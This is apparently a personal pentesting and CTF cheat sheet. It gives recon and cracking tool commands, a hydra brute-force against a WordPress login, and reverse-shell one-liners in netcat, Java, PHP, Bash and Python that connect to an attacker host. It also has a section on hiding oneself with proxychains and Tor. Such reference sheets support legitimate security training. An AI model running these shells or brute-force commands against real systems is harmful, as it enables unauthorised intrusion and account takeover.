* [CheatSheet](#cheatsheet)
   * [Planned ToDo's](#planned-todos)
   * [Useful Guides and Links](#useful-guides-and-links)
   * [Local Webserver](#local-webserver)
      * [Python](#python)
      * [PHP](#php)
      * [Ruby](#ruby)
   * [Useful Tools](#useful-tools)
      * [<a href="https://tools.kali.org/information-gathering/nmap" rel="nofollow">nmap</a>](#nmap)
      * [<a href="https://tools.kali.org/web-applications/gobuster" rel="nofollow">gobuster</a>](#gobuster)
      * [<a href="https://www.kali.org/tools/wpscan/" rel="nofollow">wpscan</a>](#wpscan)
      * [<a href="https://tools.kali.org/password-attacks/cewl" rel="nofollow">CeWL</a>](#cewl)
      * [<a href="https://tools.kali.org/information-gathering/enum4linux" rel="nofollow">enum4linux</a>](#enum4linux)
      * [<a href="https://tools.kali.org/information-gathering/goofile" rel="nofollow">goofile</a>](#goofile)
      * [<a href="https://www.exploit-db.com/searchsploit" rel="nofollow">searchsploit</a>](#searchsploit)
      * [<a href="https://tools.kali.org/password-attacks/john" rel="nofollow">John The Ripper – JTR</a>](#john-the-ripper--jtr)
      * [<a href="https://www.kali.org/tools/hydra/" rel="nofollow">hydra</a>](#hydra)
      * [<a href="https://www.kali.org/tools/radare2/" rel="nofollow">radare2</a>](#radare2)
   * [Shells](#shells)
      * [Set Listener](#set-listener)
      * [<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="nofollow">Reverse Shell</a>](#reverse-shell)
         * [netcat](#netcat)
         * [Java](#java)
         * [PHP](#php-1)
         * [Bash](#bash)
         * [Python](#python-1)
      * [Interactive Shell](#interactive-shell)
         * [Bash](#bash-1)
         * [Zsh](#zsh)
   * [Usefuls Scripts](#usefuls-scripts)
      * [HEX Converter](#hex-converter)
         * [Ascii to Hex](#ascii-to-hex)
         * [Hex to Ascii](#hex-to-ascii)
   * [Hide yourself](#hide-yourself)
      * [<a href="">VPN</a>](#vpn)
      * [<a href="https://linuxhint.com/proxychains-tutorial/" rel="nofollow">Proxy Chains</a>](#proxy-chains)
      * [<a href="https://de.wikipedia.org/wiki/Tor_(Netzwerk)" rel="nofollow">Tor</a>](#tor)
   * [<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" rel="nofollow">Shellcode Dis/Assembler</a>](#shellcode-disassembler)
   * [File Uploads](#file-uploads)
      * [Magic Numbers](#magic-numbers)  

# CheatSheet

## Planned ToDo's	

- [ ] write scripts for automating the repetitive tasks like:
  1. look for domain of the company
  2. look for subdomains of the domain 
  3. look for dns entries 
  4. use [Google Hacking](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) for deeper recon
  5. generate a detailed report of all findings
  6. ...

- [x] create a docker-based environment for pentesting/bug bounty hunting (find a way for running GUI based tools in docker) 	
  - [Kali-Docker](https://github.com/DennisFeldbusch/Kali-Docker)

## Useful Guides and Links

For Pentesting/BugBounty-Hunting there is a very detailed [map and guide](https://www.offensity.com/de/blog/just-another-recon-guide-pentesters-and-bug-bounty-hunters/) of how to proceed.

Very useful BugBounty [CheatSheet](https://github.com/EdOverflow/bugbounty-cheatsheet) from EdOverflow

Bug Bounty [Writeups](https://hackerone.com/hacktivity) for learning 

## Local Webserver

### Python

```python
python -m SimpleHTTPServer
```

```python
python3 -m http.server
```

### PHP
```php
php -S 0.0.0.0:8000
```
### Ruby
```ruby
ruby -run -e httpd . -p 8000
```
## Useful Tools

### [nmap](https://tools.kali.org/information-gathering/nmap)
scans networks
```shell-script
nmap -sC -sV -oA nmap/openadmin 10.10.10.171
```
* `-sC` = scans with the standard scripts
* `-sV` = scans the versions

### [gobuster](https://tools.kali.org/web-applications/gobuster)
bruteforce websites to find directories and/or files
```bash
gobuster dir -u http://10.10.10.10/ -w /path/to/wordlist
```
### [wpscan](https://www.kali.org/tools/wpscan/)
scans a target for wordpress related stuff
```bash
## basic scan
wpscan --url 10.10.10.10

## advanced scan with plugin detection
wpscan —url 10.10.10.10 —enumerate p,u —plugins-detection aggressive
``` 
###  [CeWL](https://tools.kali.org/password-attacks/cewl)
creates wordlist from website
```bash
cewl -d 2 -m 5 -w genwords.txt https://10.10.10.10
```
### [enum4linux](https://tools.kali.org/information-gathering/enum4linux)
enumerates Windows and Samba systems 

Ports to look for: 445, 139
```bash
enum4linux -U -o 10.10.10.10
```
### [goofile](https://tools.kali.org/information-gathering/goofile)
finding specific filetypes in domain
```bash
goofile -d kali.org -f pdf
```
### [searchsploit](https://www.exploit-db.com/searchsploit)
```bash
searchsploit tomcat
```
### [John The Ripper – JTR](https://tools.kali.org/password-attacks/john)

John the Ripper is different from tools like Hydra. Hydra does blind brute-forcing by trying username/password combinations on a service daemon like ftp server or telnet server. John however needs the hash first. So the greater challenge for a hacker is to first get the hash that is to be cracked. Now a days hashes are more easily crackable using free rainbow tables available online. Just go to one of the sites, submit the hash and if the hash is made of a common word, then the site would show the word almost instantly. Rainbow tables basically store common words and their hashes in a large database. Larger the database, more the words covered.
|Command                                                                 |Description                               |
|------------------------------------------------------------------------|------------------------------------------|
|john –wordlist=/usr/share/wordlists/rockyou.txt hash                    |JTR password cracking                     |
|john –format=descrypt –wordlist/usr/share/wordlists/rockyou.txt hash.txt|JTR forced descrypt cracking with wordlist|
|john –format=descrypt hash –show                                        |JTR forced descrypt brute force cracking  |

### [hydra](https://www.kali.org/tools/hydra/)
```zsh
hydra -L wordlist -p test 10.10.147.44 -V http-form-post "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid Username" -t 30
```
### [radare2](https://www.kali.org/tools/radare2/)
radare2 is a tool for reverse-engineering
```zsh
# start radare2
radare2 file

# analyze all
aa 

# list all functions 
afl

# set selection to main function
s main 

# disassemble
pdf 

# show graph
VV
```
#### x86 registers
```
  ================ rax (64 bits)
          ======== eax (32 bits)
              ====  ax (16 bits)
              ==    ah (8 bits)
                ==  al (8 bits)
```

#### register purposes

| Register | Purpose                                | Saved across calls |
|----------|----------------------------------------|--------------------|
| RAX      | temp register; return value            | no                 |
| RBX      | callee-saved                           | yes                |
| RCX      | used to pass 4th argument to functions | no                 |
| RDX      | used to pass 3rd argument to functions | no                 |
| RSP      | stack pointer                          | yes                |
| RBP      | callee-saved; base pointer             | yes                |
| RSI      | used to pass 2nd argument to functions | no                 |
| RDI      | used to pass 1st argument to functions | no                 |
| R8       | used to pass 5th argument to functions | no                 |
| R9       | used to pass 6th argument to functions | no                 |
| R10-11   | temporary                              | no                 |
| R12-15   | callee-saved registers                 | yes                |

## Shells

### Set Listener 
```bash
nc -lnvp 4000
```

### [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
#### netcat
```bash
nc -e /bin/sh 10.10.15.22 4000
```
#### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.15.22/4000;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
#### PHP
```php
php -r '$sock=fsockopen("10.10.15.22",4000);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
#### Bash
```bash
bash -i >& /dev/tcp/10.10.15.22/4000 0>&1
```
#### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.22",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### Interactive Shell
* can be executed with python or python3
#### Bash 
```python
python(3) -c 'import pty; pty.spawn("/bin/bash")'
```
```cmd
Ctrl-Z
```
```cmd
stty raw -echo
```
```
fg
```
#### Zsh 
```python
python(3) -c 'import pty; pty.spawn("/bin/bash")'
```
```cmd
Ctrl-Z
```
```cmd
stty raw -echo; fg
```
## Usefuls Scripts
### HEX Converter
#### Ascii to Hex
```bash
#!/bin/bash
echo $1 | tr -d "\n" | hexdump -v -e '16/1 "%02x " "\n"'
```
#### Hex to Ascii
```bash
#!/bin/bash
echo $1 | xxd -r -p
```
## Hide yourself
Interesting [Stack Exchange](https://security.stackexchange.com/questions/103792/is-using-vpn-tor-and-proxychains-together-more-secure) link
### [VPN]()
### [Proxy Chains](https://linuxhint.com/proxychains-tutorial/)
A Proxy is an instance between both communication partners. If you send a request to a server the proxy intercepts it and is forwarding this request to the server but is behaving like itself send the request so the server don't know about me. And the exact way back.

A Proxy Chain are multile Proxy Servers chained together so it is way more difficult to get to know the initial sender(client)
### [Tor](https://de.wikipedia.org/wiki/Tor_(Netzwerk))
Here is a nice [graphic](https://www.eff.org/pages/tor-and-https) on who sees what in Tor and HTTPS cases.

## [Shellcode Dis/Assembler](http://shell-storm.org/online/Online-Assembler-and-Disassembler/)

## File Uploads

### Magic Numbers

* these magic numbers at the start of a file define the type of file
```
BMP : 42 4D
JPG : FF D8 FF E0
PNG : 89 50 4E 47
GIF : 47 49 46 38
```


